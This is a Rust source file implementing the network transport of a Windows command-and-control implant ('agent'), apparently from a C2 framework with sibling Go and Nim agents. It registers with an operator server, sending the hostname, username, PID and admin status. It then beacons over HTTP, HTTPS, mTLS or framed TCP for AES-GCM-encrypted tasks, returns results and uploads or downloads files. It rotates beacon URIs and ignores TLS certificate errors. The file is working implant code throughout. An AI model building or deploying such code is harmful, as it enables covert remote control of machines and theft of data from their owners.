/// HTTP/HTTPS/TCP/mTLS transport for the Rust agent.
/// HTTP/HTTPS/mTLS: WinHTTP (same protocol as Go/Nim agents).
/// TCP: std::net with 4-byte LE-length-prefixed framed JSON.
///
/// Registration: POST /register or TCP "register" msg → {agent_id, aes_key}
/// Beacon:       GET  /beacon/<id> or TCP "beacon" → AES-GCM tasks; 204/no_tasks = none
/// Result:       POST /result/<id> or TCP "result" → AES-GCM {task_id,output,error,is_admin}
/// Upload:       POST /upload/<id>/<name> or TCP "upload" → AES-GCM {task_id,filename,data}
/// Download:     GET  /dl/<id>/<name> → AES-GCM raw bytes (TCP: not supported)
use core::ffi::c_void;
use core::ptr;
use std::io::{Read, Write};
use base64::{engine::general_purpose::STANDARD, Engine as _};
use serde_json::Value;
use windows_sys::Win32::Networking::WinHttp::{
    WinHttpCloseHandle, WinHttpConnect, WinHttpOpen, WinHttpOpenRequest, WinHttpQueryHeaders,
    WinHttpReadData, WinHttpReceiveResponse, WinHttpSendRequest, WinHttpSetOption,
    WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_FLAG_SECURE, WINHTTP_OPTION_SECURITY_FLAGS,
    WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_QUERY_STATUS_CODE,
};

use crate::{config, crypto};

// Self-signed cert ignore flags (standard WinHTTP constants)
const SEC_IGNORE_UNKNOWN_CA: u32        = 0x0100;
const SEC_IGNORE_CERT_WRONG_USAGE: u32  = 0x0200;
const SEC_IGNORE_CERT_CN_INVALID: u32   = 0x1000;
const SEC_IGNORE_CERT_DATE_INVALID: u32 = 0x2000;

// mTLS: set the client certificate on a WinHTTP request
const WINHTTP_OPTION_CLIENT_CERT_CONTEXT: u32 = 47;

// crypt32 encoding / search constants
const X509_ASN_ENCODING: u32   = 0x00000001;
const PKCS_7_ASN_ENCODING: u32 = 0x00010000;
const CERT_FIND_ANY: u32       = 0;
const CRYPT_EXPORTABLE: u32    = 0x00000001;

// ── crypt32 imports ───────────────────────────────────────────────────────────

#[repr(C)]
struct CryptDataBlob {
    cb_data: u32,
    pb_data: *const u8,
}

#[link(name = "crypt32")]
extern "system" {
    fn PFXImportCertStore(
        p_pfx:       *const CryptDataBlob,
        sz_password: *const u16,
        dw_flags:    u32,
    ) -> *mut c_void;

    fn CertFindCertificateInStore(
        h_cert_store:        *mut c_void,
        dw_cert_encoding:    u32,
        dw_find_flags:       u32,
        dw_find_type:        u32,
        pv_find_para:        *const c_void,
        p_prev_cert_context: *const c_void,
    ) -> *mut c_void;
}

// ── RAII WinHTTP handle wrapper ───────────────────────────────────────────────

struct WHandle(*mut c_void);
impl Drop for WHandle {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { WinHttpCloseHandle(self.0); }
        }
    }
}
impl WHandle {
    fn is_null(&self) -> bool { self.0.is_null() }
    fn raw(&self) -> *mut c_void { self.0 }
}

// ── Wide string helper ────────────────────────────────────────────────────────

fn wstr(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(core::iter::once(0u16)).collect()
}

// ── URL parser ────────────────────────────────────────────────────────────────

struct ParsedUrl {
    is_https: bool,
    host: String,
    port: u16,
    base: String, // path prefix (may be empty)
}

fn parse_url(url: &str) -> ParsedUrl {
    let (is_https, rest) = if url.starts_with("https://") {
        (true, &url[8..])
    } else if url.starts_with("http://") {
        (false, &url[7..])
    } else {
        (false, url)
    };
    let default_port: u16 = if is_https { 443 } else { 80 };

    let (host_port, base) = if let Some(i) = rest.find('/') {
        (&rest[..i], rest[i..].to_string())
    } else {
        (rest, String::new())
    };

    let (host, port) = if let Some(i) = host_port.rfind(':') {
        let p = host_port[i + 1..].parse().unwrap_or(default_port);
        (host_port[..i].to_string(), p)
    } else {
        (host_port.to_string(), default_port)
    };

    ParsedUrl { is_https, host, port, base }
}

// ── TCP framing helpers ───────────────────────────────────────────────────────

/// Write a 4-byte LE length prefix followed by `data` to the stream.
fn tcp_write_frame(stream: &mut std::net::TcpStream, data: &[u8]) -> bool {
    let len = data.len() as u32;
    stream.write_all(&len.to_le_bytes()).is_ok() && stream.write_all(data).is_ok()
}

/// Read a 4-byte LE length prefix then that many bytes from the stream.
fn tcp_read_frame(stream: &mut std::net::TcpStream) -> Option<Vec<u8>> {
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).ok()?;
    let len = u32::from_le_bytes(len_buf) as usize;
    let mut data = vec![0u8; len];
    stream.read_exact(&mut data).ok()?;
    Some(data)
}

// ── mTLS certificate loader ───────────────────────────────────────────────────

/// Decode `config::AGENT_PFX` (base64 PKCS12) and return a CERT_CONTEXT pointer
/// suitable for `WINHTTP_OPTION_CLIENT_CERT_CONTEXT`.  Returns null on any failure.
fn load_mtls_cert() -> *mut c_void {
    let pfx_b64 = config::AGENT_PFX;
    if pfx_b64.is_empty() {
        return ptr::null_mut();
    }
    let pfx_bytes = match STANDARD.decode(pfx_b64) {
        Ok(b) => b,
        Err(_) => return ptr::null_mut(),
    };
    let blob = CryptDataBlob {
        cb_data: pfx_bytes.len() as u32,
        pb_data: pfx_bytes.as_ptr(),
    };
    // Empty (null-terminated) password for the PKCS12 bag
    let password: Vec<u16> = core::iter::once(0u16).collect();
    unsafe {
        let h_store = PFXImportCertStore(&blob, password.as_ptr(), CRYPT_EXPORTABLE);
        if h_store.is_null() {
            return ptr::null_mut();
        }
        // Return the first cert in the store.  The store is intentionally left open
        // so that the returned CERT_CONTEXT remains valid for the process lifetime.
        CertFindCertificateInStore(
            h_store,
            X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
            0,
            CERT_FIND_ANY,
            ptr::null(),
            ptr::null(),
        )
    }
}

// ── Core HTTP implementation ──────────────────────────────────────────────────

/// Internal HTTP worker.  Pass `cert_ctx = null_mut()` for plain HTTP/HTTPS;
/// pass a valid CERT_CONTEXT pointer for mTLS.
fn http_do_inner(method: &str, path: &str, body: &[u8], cert_ctx: *mut c_void) -> Option<(u32, Vec<u8>)> {
    let p = parse_url(config::SERVER_URL);
    let full_path = format!("{}{}", p.base, path);

    let ua_w   = wstr(config::USER_AGENT);
    let host_w = wstr(&p.host);
    let meth_w = wstr(method);
    let path_w = wstr(&full_path);

    let secure = if p.is_https { WINHTTP_FLAG_SECURE } else { 0 };

    unsafe {
        let h_sess = WHandle(WinHttpOpen(
            ua_w.as_ptr(),
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            ptr::null(),
            ptr::null(),
            0,
        ));
        if h_sess.is_null() { return None; }

        let h_conn = WHandle(WinHttpConnect(h_sess.raw(), host_w.as_ptr(), p.port, 0));
        if h_conn.is_null() { return None; }

        let h_req = WHandle(WinHttpOpenRequest(
            h_conn.raw(),
            meth_w.as_ptr(),
            path_w.as_ptr(),
            ptr::null(),
            ptr::null(),
            ptr::null(),
            secure,
        ));
        if h_req.is_null() { return None; }

        if p.is_https {
            // Ignore self-signed cert errors (same as Go/Nim agents)
            let flags: u32 = SEC_IGNORE_UNKNOWN_CA
                | SEC_IGNORE_CERT_WRONG_USAGE
                | SEC_IGNORE_CERT_CN_INVALID
                | SEC_IGNORE_CERT_DATE_INVALID;
            WinHttpSetOption(
                h_req.raw(),
                WINHTTP_OPTION_SECURITY_FLAGS,
                &flags as *const u32 as *const c_void,
                core::mem::size_of::<u32>() as u32,
            );

            // mTLS: attach our client certificate to the request
            if !cert_ctx.is_null() {
                WinHttpSetOption(
                    h_req.raw(),
                    WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
                    cert_ctx as *const c_void,
                    40u32, // sizeof(CERT_CONTEXT) on x64 per WinHTTP docs
                );
            }
        }

        let body_ptr: *const c_void = if body.is_empty() {
            ptr::null()
        } else {
            body.as_ptr() as *const c_void
        };

        if WinHttpSendRequest(
            h_req.raw(),
            ptr::null(),
            0,
            body_ptr,
            body.len() as u32,
            body.len() as u32,
            0,
        ) == 0 { return None; }

        if WinHttpReceiveResponse(h_req.raw(), ptr::null_mut()) == 0 { return None; }

        let mut status: u32 = 0;
        let mut sz: u32 = 4;
        WinHttpQueryHeaders(
            h_req.raw(),
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            ptr::null(),
            &mut status as *mut u32 as *mut c_void,
            &mut sz,
            ptr::null_mut(),
        );

        let mut resp = Vec::new();
        let mut buf = [0u8; 8192];
        let mut got: u32 = 0;
        loop {
            if WinHttpReadData(
                h_req.raw(),
                buf.as_mut_ptr() as *mut c_void,
                buf.len() as u32,
                &mut got,
            ) == 0 || got == 0 { break; }
            resp.extend_from_slice(&buf[..got as usize]);
        }

        Some((status, resp))
    }
}

/// Public HTTP helper (no client certificate).  Used for plain http/https transport.
pub fn http_do(method: &str, path: &str, body: &[u8]) -> Option<(u32, Vec<u8>)> {
    http_do_inner(method, path, body, ptr::null_mut())
}

// ── Agent transport ───────────────────────────────────────────────────────────

pub struct AgentTransport {
    pub agent_id: String,
    pub aes_key:  Vec<u8>,
    uri_idx:      usize,
    uri_list:     Vec<String>,
    /// "host:port" for TCP transport; empty for HTTP/HTTPS/mTLS.
    tcp_addr:     String,
    /// Persistent TCP connection (TCP transport only).
    tcp_conn:     Option<std::net::TcpStream>,
    /// CERT_CONTEXT pointer for mTLS; null_mut() otherwise.
    /// Raw pointer: AgentTransport is only ever used on the main thread.
    cert_ctx:     *mut c_void,
}

impl Default for AgentTransport {
    fn default() -> Self {
        AgentTransport {
            agent_id: String::new(),
            aes_key:  Vec::new(),
            uri_idx:  0,
            uri_list: Vec::new(),
            tcp_addr: String::new(),
            tcp_conn: None,
            cert_ctx: ptr::null_mut(),
        }
    }
}

pub struct TaskWire {
    pub id:      i64,
    pub typ:     String,
    pub args:    String,
    pub payload: Vec<u8>,
}

impl AgentTransport {
    pub fn new() -> Self {
        let mut t = AgentTransport::default();
        if !config::BEACON_URIS.is_empty() {
            t.uri_list = config::BEACON_URIS.split(',').map(|s| s.to_string()).collect();
        }
        match config::TRANSPORT {
            "tcp" => {
                // Strip "tcp://" prefix; store bare "host:port"
                let addr = config::SERVER_URL
                    .strip_prefix("tcp://")
                    .unwrap_or(config::SERVER_URL);
                t.tcp_addr = addr.to_string();
            }
            "mtls" => {
                t.cert_ctx = load_mtls_cert();
            }
            _ => {}
        }
        t
    }

    fn exe_name() -> String {
        std::env::current_exe()
            .ok()
            .and_then(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
            .unwrap_or_else(|| "agent.exe".to_string())
    }

    pub fn register(&mut self) -> bool {
        self.try_register().is_some()
    }

    fn is_elevated() -> bool {
        use windows_sys::Win32::Foundation::CloseHandle;
        use windows_sys::Win32::Security::{
            GetTokenInformation, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation,
        };
        use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
        unsafe {
            let mut token = 0isize;
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
                return false;
            }
            let mut elev = TOKEN_ELEVATION { TokenIsElevated: 0 };
            let mut sz: u32 = core::mem::size_of::<TOKEN_ELEVATION>() as u32;
            let ok = GetTokenInformation(
                token, TokenElevation,
                &mut elev as *mut _ as *mut core::ffi::c_void,
                sz, &mut sz,
            );
            CloseHandle(token);
            ok != 0 && elev.TokenIsElevated != 0
        }
    }

    // ── TCP helpers ───────────────────────────────────────────────────────────

    /// Connect tcp_conn if not already connected.  Returns false on failure.
    fn tcp_ensure_connected(&mut self) -> bool {
        if self.tcp_conn.is_some() { return true; }
        match std::net::TcpStream::connect(self.tcp_addr.as_str()) {
            Ok(conn) => { self.tcp_conn = Some(conn); true }
            Err(_) => false,
        }
    }

    /// Serialize `{"t": typ, "p": payload}` and write a framed message.
    fn tcp_send_msg(&mut self, typ: &str, payload: &Value) -> bool {
        let msg  = serde_json::json!({"t": typ, "p": payload});
        let data = msg.to_string().into_bytes();
        if let Some(ref mut conn) = self.tcp_conn {
            tcp_write_frame(conn, &data)
        } else {
            false
        }
    }

    /// Read one framed message and deserialize `{"t":..., "p":...}`.
    fn tcp_recv_msg(&mut self) -> Option<(String, Value)> {
        let data = if let Some(ref mut conn) = self.tcp_conn {
            tcp_read_frame(conn)?
        } else {
            return None;
        };
        let j: Value = serde_json::from_slice(&data).ok()?;
        let t = j["t"].as_str()?.to_string();
        let p = j["p"].clone();
        Some((t, p))
    }

    // ── Registration ──────────────────────────────────────────────────────────

    fn try_register(&mut self) -> Option<()> {
        let body = serde_json::json!({
            "hostname":     std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into()),
            "username":     std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into()),
            "os":           if cfg!(target_arch = "x86_64") { "windows/amd64" } else { "windows/x86" },
            "pid":          std::process::id(),
            "transport":    config::TRANSPORT,
            "sleep_sec":    config::SLEEP_SEC,
            "jitter_pct":   config::JITTER_PCT,
            "process_name": Self::exe_name(),
            "is_admin":     Self::is_elevated(),
        });

        if config::TRANSPORT == "tcp" {
            if !self.tcp_ensure_connected() { return None; }
            if !self.tcp_send_msg("register", &body) {
                self.tcp_conn = None;
                return None;
            }
            let (typ, p) = self.tcp_recv_msg()?;
            if typ != "register_resp" { return None; }
            self.agent_id = p["agent_id"].as_str()?.to_string();
            self.aes_key  = STANDARD.decode(p["aes_key"].as_str()?).ok()?;
            return Some(());
        }

        // HTTP / HTTPS / mTLS
        let (code, resp) = http_do_inner("POST", "/register", body.to_string().as_bytes(), self.cert_ctx)?;
        if code != 200 || resp.is_empty() { return None; }
        let j: Value = serde_json::from_slice(&resp).ok()?;
        self.agent_id = j["agent_id"].as_str()?.to_string();
        self.aes_key  = STANDARD.decode(j["aes_key"].as_str()?).ok()?;
        Some(())
    }

    // ── Beacon ────────────────────────────────────────────────────────────────

    pub fn beacon(&mut self) -> Vec<TaskWire> {
        if config::TRANSPORT == "tcp" {
            if !self.tcp_ensure_connected() { return vec![]; }
            if !self.tcp_send_msg("beacon", &Value::Null) {
                self.tcp_conn = None;
                return vec![];
            }
            let (typ, p) = match self.tcp_recv_msg() {
                Some(m) => m,
                None    => { self.tcp_conn = None; return vec![]; }
            };
            if typ == "no_tasks" { return vec![]; }
            if typ != "tasks"    { return vec![]; }
            let b64 = match p.as_str() { Some(s) => s, None => return vec![] };
            let enc = match STANDARD.decode(b64) { Ok(e) => e, Err(_) => return vec![] };
            let plain = match crypto::open(&self.aes_key, &enc) {
                Some(p) => p,
                None    => return vec![],
            };
            return parse_tasks(&plain);
        }

        // HTTP / HTTPS / mTLS
        let path = if self.uri_list.is_empty() {
            format!("/beacon/{}", self.agent_id)
        } else {
            let uri = &self.uri_list[self.uri_idx % self.uri_list.len()];
            self.uri_idx += 1;
            format!("{}/{}", uri, self.agent_id)
        };
        let (code, resp) = http_do_inner("GET", &path, &[], self.cert_ctx).unwrap_or((0, vec![]));
        if code == 204 || resp.is_empty() || code != 200 { return vec![]; }
        let plain = match crypto::open(&self.aes_key, &resp) {
            Some(p) => p,
            None    => return vec![],
        };
        parse_tasks(&plain)
    }

    // ── Result / Upload / Download ────────────────────────────────────────────

    pub fn send_result(&mut self, task_id: i64, output: &str, error: &str) {
        self.send_result_admin(task_id, output, error, false);
    }

    pub fn send_result_admin(&mut self, task_id: i64, output: &str, error: &str, is_admin: bool) {
        if self.aes_key.is_empty() { return; }
        let plain = serde_json::json!({
            "task_id":  task_id,
            "output":   output,
            "error":    error,
            "is_admin": is_admin,
        }).to_string();
        let enc = crypto::seal(&self.aes_key, plain.as_bytes());

        if config::TRANSPORT == "tcp" {
            let payload = Value::String(STANDARD.encode(&enc));
            if !self.tcp_send_msg("result", &payload) {
                self.tcp_conn = None;
            }
            return;
        }

        let path = format!("/result/{}", self.agent_id);
        let _ = http_do_inner("POST", &path, &enc, self.cert_ctx);
    }

    pub fn upload_file(&mut self, task_id: i64, filename: &str, data: &[u8]) {
        if self.aes_key.is_empty() { return; }

        if config::TRANSPORT == "tcp" {
            let inner = serde_json::json!({
                "task_id":  task_id,
                "filename": filename,
                "data":     STANDARD.encode(data),
            }).to_string();
            let enc = crypto::seal(&self.aes_key, inner.as_bytes());
            let payload = Value::String(STANDARD.encode(&enc));
            if !self.tcp_send_msg("upload", &payload) {
                self.tcp_conn = None;
            }
            return;
        }

        // HTTP / HTTPS / mTLS — encrypt just the raw file bytes
        let enc  = crypto::seal(&self.aes_key, data);
        let path = format!("/upload/{}/{}", self.agent_id, filename);
        let _ = http_do_inner("POST", &path, &enc, self.cert_ctx);
    }

    pub fn download_file(&mut self, filename: &str) -> Vec<u8> {
        // TCP has no download primitive
        if config::TRANSPORT == "tcp" { return vec![]; }
        if self.aes_key.is_empty() { return vec![]; }
        let path = format!("/dl/{}/{}", self.agent_id, filename);
        let (code, resp) = http_do_inner("GET", &path, &[], self.cert_ctx).unwrap_or((0, vec![]));
        if code != 200 || resp.is_empty() { return vec![]; }
        crypto::open(&self.aes_key, &resp).unwrap_or_default()
    }
}

// ── Task deserialisation helper ───────────────────────────────────────────────

fn parse_tasks(plain: &[u8]) -> Vec<TaskWire> {
    let j: Value = match serde_json::from_slice(plain) {
        Ok(v)  => v,
        Err(_) => return vec![],
    };
    let arr = match j["tasks"].as_array() {
        Some(a) => a,
        None    => return vec![],
    };
    arr.iter().map(|t| TaskWire {
        id:      t["id"].as_i64().unwrap_or(0),
        typ:     t["type"].as_str().unwrap_or("").to_string(),
        args:    t.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string(),
        payload: t.get("payload")
                  .and_then(|v| v.as_str())
                  .filter(|s| !s.is_empty())
                  .and_then(|s| STANDARD.decode(s).ok())
                  .unwrap_or_default(),
    }).collect()
}
